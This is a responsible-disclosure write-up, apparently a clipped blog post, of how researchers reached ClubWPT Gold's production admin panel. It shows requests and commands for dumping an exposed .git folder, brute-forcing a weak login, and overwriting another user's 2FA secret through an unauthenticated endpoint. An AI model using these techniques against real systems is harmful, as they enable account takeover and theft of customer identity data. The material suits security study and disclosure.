---
title: "Hacking the World Poker Tour: Inside ClubWPT Gold’s Back Office"
source: https://samcurry.net/hacking-clubwpt-gold
source_host: samcurry.net
clip_date: 2026-11-11T10:39:38+08:00
trace_id: ae5e80de-b84b-4740-917b-5dd517c8d42c
content_hash: 4319277d49e63569ed7960c5e667104e393b541c62b6622b74cf6b4a028f5be6
status: synced
tags: []
series: null
feed_source: Sam Curry·漏洞研究
ai_summary: null
ai_summary_style: null
images_status:
  total: 15
  succeeded: 15
  failed_urls: []
notion_page_id: 41575244-d011-81b4-acc9-ecae5c32ede2
ioc:
  cves: []
  cwes: []
  hashes:
    - c438f2a0dd6ab3022939d4bf339dce63
  domains: []
  tools: []
  techniques: []
---

![Hacking the World Poker Tour: Inside ClubWPT Gold’s Back Office](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/6dfd4dfda9cbbba2.png)

In June, 2025, Shubs Shah and I discovered a vulnerability in the online poker website ClubWPT Gold which would have allowed an attacker to fully access the core back office application that is used for all administrative site functionality. This vulnerability could have been used to retrieve drivers licenses, passport numbers, IP addresses, transactions, game history, and more.

After reporting the vulnerability, ClubWPT thoroughly patched the issue and confirmed that it had never been exploited maliciously. The host is now inaccessible, and we worked with them to confirm that it is no longer reproducible.

## Introduction

For the last few DEF CONs, my guilty pleasure has been sneaking away to the Aria poker room and playing No Limit Holdem until 3 or 4 in the morning. This habit was never really a problem as there wasn't a casino within 50 miles of where I lived, but when I learned that the World Poker Tour had created an online poker website that was legal in the US (under [sweepstakes laws](https://upswingpoker.com/what-is-sweepstakes-poker-legal/)), I got super curious and registered.

After signing up, I was able to purchase and cash out "sweep coins" (credits that could be used to play on the website) using a credit card. Pretty soon I was playing (mostly losing) in online tournaments, and got pretty sucked into the online gambling world.

Eventually I got curious on how the actual ClubWPT Gold infrastructure worked and started poking around on the website.

### A Weird Domain in the JavaScript

While playing poker on the ClubWPT Gold website, I noticed a strange URL saved to a variable in the JavaScript's environment variables:

```javascript
VITE_URL_AMOE_CODE:"https://apigate.clubwpt.liuxinyi1.cn/amoeserver"
```

This URL variable was odd, because there were no other references in the JavaScript with the "liuxinyi1.cn" root domain, nor any code which actually used the variable. It was also strange that it was a Chinese domain, given that ClubWPT Gold was a US company.

My immediate guess was that this domain was somehow related to the development of the website, and that it was outsourced to another domain. I went ahead and checked what other subdomains there were on"liuxinyi1.cn" and if any of them were related to ClubWPT Gold.

```rust
zlz@sd-156740 ~> subs liuxinyi1.cn | grep -i clubwpt

coin-admin.clubwpt-dev.liuxinyi1.cn -> 18.142.27.164
proxy-server.clubwpt.liuxinyi1.cn -> 54.251.42.68
gameserver.clubwpt-dev.liuxinyi1.cn -> 18.142.27.164
coin-admin-kai.clubwpt.liuxinyi1.cn -> 54.251.42.68
reverse-proxy.clubwpt.liuxinyi1.cn -> 54.251.42.68
coin-admin-ek.clubwpt.liuxinyi1.cn -> 54.251.42.68
mtt-resource.clubwpt.liuxinyi1.cn -> 54.251.42.68
reverse-proxy.clubwpt-dev.liuxinyi1.cn -> 18.142.27.164
mtt-apimtt.clubwpt.liuxinyi1.cn -> 54.251.42.68
release-wc.frontend.clubwpt.liuxinyi1.cn -> 54.251.42.68
world.clubwpt.liuxinyi1.cn -> 54.251.42.68
vue-alli.clubwpt-dev.liuxinyi1.cn -> 18.142.27.164
clubwpt.liuxinyi1.cn -> 13.250.188.192
ploserver.clubwpt.liuxinyi1.cn -> 54.251.42.68
```

There were dozens of ClubWPT Gold services running on the "liuxinyi1.cn" subdomains, but the most interesting one by far was the "coin-admin.clubwpt.liuxinyi1.cn" domain. It was a generic login page that seemed to be for some sort of administration tool.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/98945b0ceccf52e1.png)

We kicked off a ffuf scan (an endpoint discovery tool) to see if there were any unauthenticated endpoints, and some really good results came back:

```console
zlz@sd-156740 ~> ffufdir https://coin-admin.clubwpt.liuxinyi1.cn/FUZZ

.env		[Status: 200, Size: 2264, Words: 186, Lines: 91, Duration: 6ms]
.git/		[Status: 301, Size: 221, Words: 9, Lines: 7, Duration: 11ms]
```

We loaded the ".env" endpoint and there were dozens of various secrets exposed. Most of them were for internal services, but there were also Alibaba cloud credentials:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/4189f3bd33cc8e7a.png)

We tested the Alibaba cloud credentials using the aliyun CLI tool, but they didn't seem to have any permissions.

```typescript
zlz@sd-156740 ~> export ALIBABA_CLOUD_ACCESS_KEY_ID=KEY_ID_FROM_ENV
zlz@sd-156740 ~> export ALIBABA_CLOUD_ACCESS_KEY_SECRET=KEY_SECRET_FROM_ENV
zlz@sd-156740 ~> aliyun oss ls oss://bucket-name-leaked-in-env/
ERROR: oss: service returned error: StatusCode=403, ErrorCode=AccessDenied, ErrorMessage="The bucket you access does not belong to you.", RequestId=68B6D3EDCD8814372859C7C9, Ec=0003-00000001, Bucket=bucket-name-leaked-in-env, Object=
```

Since we couldn't access anything else using the disclosed secrets from the exposed ".env" file, the next thing to try was cloning the exposed ".git" folder with tigert1998's Python3 GitHack tool.

```
python3 GitHack.py https://coin-admin.clubwpt.liuxinyi1.cn/.git/
```

After a few seconds, we started getting files back. The ".git" endpoint was exposing the admin panel source code! We let the tool run for a while, ripping the back office source code from the website.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d045bdad8ae2322f.png)

When the tool finished, we had what looked to be a full copy of the full ClubWPT Gold back office application. It had hundreds of endpoints in dozens of PHP files leaked via GitHack.

We reviewed the PHP files and couldn't find many issues. All of the core authentication logic was super solid, and we wouldn't be able to call anything unauthenticated.

The only vulnerability that we did find in the source code was a 2FA bypass. This was useless as we didn't have a valid login, and at this point, we didn't even have any usernames.

### Authenticating to ClubWPT Gold's Back Office (staging)

While trying to find unauthenticated vulnerabilities, an interesting line caught our attention in the ".env" file:

```
manager = jake,eg3478,mike2278,develop
```

These appeared to be usernames hardcoded into the environment variables. We checked the source code and saw that the website used these values to assign administrator privileges to certain users for the application, so they were likely valid accounts that we could try and login to.

Since it was a development environment, maybe they had weak credentials? We tested all of the really basic stuff, like "123456" and "admin". Surely this wouldn't work, but there was nothing else to try.

Burp Suite's intruder tool ran for a few minutes. Every response so far was "invalid password". I went ahead and removed all entries with the string "invalid password" and updated the results table. There was one result: a 302 redirect to "index.html".

**HTTP Request**

```
POST /admin/login/index.html HTTP/2
Host: coin-admin.clubwpt.liuxinyi1.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 49

username=eg3478&password=123456&change_timezone=PST
```

**HTTP Response**

```
HTTP/2 302 Found
Location: /admin/login/index.html
Set-Cookie: s46ea418a=c438f2a0dd6ab3022939d4bf339dce63; path=/; HttpOnly
```

The password "123456" for the "eg3478" user worked. And the account didn't even have any 2FA set. We were immediately logged into the staging version of ClubWPT Gold's back office.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c246ccd4c1e1d9ee.png)

There were hundreds of endpoints for pretty much everything that you could imagine a poker website would have on their backend. You could retrieve the KYC details of any players, add coins to accounts, ban them, and inspect gameplay history for anyone. It seemed to be the full testing infrastructure for the ClubWPT Gold admin panel connected to a staging website.

We searched for our username and couldn't find it. None of the logs had any actual data. It was all dummy accounts. This was really cool to see, but there wasn't any real impact yet.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/efe759e7717457b0.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/dc728360afe7dfc9.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/4f621f5d6a4a1372.png)

An attacker could maybe exploit this to get a foothold somewhere, but so far, there was no customer data. We decided that we would see if there was an accessible production version of the website somewhere before reporting it.

### Authenticating to ClubWPT Gold's Back Office (production)

We ran the following command to pull subdomains from the core ClubWPT Gold website and just dirty grep for an admin panel:

```
zlz@sd-156740 ~> subs clubwptgold.com | grep -i admin

https://coin-admin.clubwptgold.com [403] [] [4517] [Attention Required! | Cloudflare] [Cloudflare,HTTP/3]
```

Interesting. There was a coin admin host on the actual ClubWPT Gold website, but it appeared to be configured to use Cloudflare Zero Trust or something.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e736fdde88f265ca.png)

Maybe we could use Censys like we did previously to find the host IP. Shubs went ahead and searched for public certificates for "clubwptgold.com" and found something.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/3446de959337196f.png)

We loaded the Censys IP and tried to login using the credentials from the staging website:

**HTTP Request**

```
POST /admin/login/index.html HTTP/2
Host: coin-admin.clubwpt.liuxinyi1.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 49

username=eg3478&password=123456&change_timezone=PST
```

**HTTP Response**

```
HTTP/2 302 Found
Location: /admin/login/2fa.html
Set-Cookie: s46ea418a=c438f2a0dd6ab3022939d4bf339dce63; path=/; HttpOnly
```

It worked. We had a valid login to what might be the ClubWPT Gold back office, but this time, there was 2FA.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/22ea275bf595c57d.png)

Luckily for us, we had found that previous vulnerability to bypass 2FA when reviewing the staging website's source code:

```php
function bind() {

    // values pulled from user input
    $secret  = input("secret");   // attacker controls this
    $user_id = input("uid");      // attacker controls this

    // check if user already has a 2FA record
    $record = DB.find("UserOtp", where uid = $user_id);

    if ($record exists) {
        // update with attacker-supplied secret
        DB.update("UserOtp", where uid = $user_id, data = {
            secret      => $secret,
            update_time => now()
        });
    } else {
        // insert new record for attacker-chosen uid
        DB.insert("UserOtp", data = {
            uid         => $user_id,
            secret      => $secret,
            create_time => now(),
            update_time => now()
        });
    }

    // always returns "success"
    return json({
        code => 0,
        url  => "/admin/otp/index"
    });
}
```

The "/admin/otp/bind" endpoint was fully unauthenticated and would allow an attacker to update anyone's 2FA secret via their user ID. We prayed that the user ID on the production website would be the same as the one on staging and sent the following request:

**HTTP Request**

```
POST /admin/otp/bind HTTP/2
Host: origin_ip_of_production_admin_panel
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 33

uid=10009&secret=XN5XPR72SDX2U3M2
```

**HTTP Response**

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 65

{
  "code": 0,
  "url": "/admin/otp/index"
}
```

We successfully updated the 2FA, and then logged in. The data was different from the previous site we'd logged into. There were real Gmails, phone numbers, and customer data. We were logged into production.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d849d05ce3a424bd.png)

This was all production data. I searched for my nickname on the user management endpoint, and found all of my KYC data.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/70ff5ed1027b0fb3.png)

The back office application had tons of super interesting endpoints. I could see all deposits, AMOE requests, KYC data (including the IP address and exact coordinates of any player), and administrative site statistics like the total deposits and withdrawals.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/9c7877f5a22daba4.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d0989245ec83f53f.png)

Once we saw customer PII, we stopped immediately and reported the finding. We emailed a bunch of people and opened support tickets, but had the same experience as the past gambling websites. It turns out that there are a lot of people who send a lot of strange emails to gambling websites, so it was very difficult to get in touch with someone who would take us seriously.

I'd decided that it was probably best to continue reaching out to people given that we'd overwritten the 2FA secret on one of the accounts, so I reached out to a few of ClubWPT Gold's ambassadors in hopes that they could connect us to someone. In just a few hours, we were in touch with their head of infrastructure.

We disclosed the vulnerability and the ClubWPT Gold team fixed everything in just a few hours. They were super receptive and worked with us to make sure that everything was resolved.

## Credit

-   Sam Curry ([https://x.com/samwcyo](https://x.com/samwcyo))
-   Shubs Shah ([https://x.com/infosec_au](https://x.com/infosec_au))

## Thanks

Thanks to Ian Carroll, Gal Nagli, Joel Margolis, Brett Buerhaus, and Justin Rhinehart for reviewing the post. Thanks to ClubWPT Gold for being very receptive and helpful when disclosing the vulnerability. Thanks to Alexandra Botez for getting us in touch with the ClubWPT Gold team.
